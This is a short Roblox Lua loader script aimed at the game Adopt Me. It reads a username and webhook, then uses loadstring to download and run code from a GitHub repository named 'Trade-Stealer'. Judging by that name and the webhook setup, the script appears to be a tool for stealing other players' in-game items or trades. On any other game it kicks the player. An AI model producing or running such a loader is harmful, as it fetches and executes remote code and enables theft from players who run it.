local Username = Username or ""
local Webhook = Webhook or ""

local gameId = game.PlaceId
local player = game:GetService("Players").LocalPlayer

if gameId == 920587237 then
    -- Adopt Me
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Trade-Stealer/Universal/refs/heads/main/Roblox"))()
else
    -- Unsupported game
    player:Kick("Adopt Me! Only supported")
end
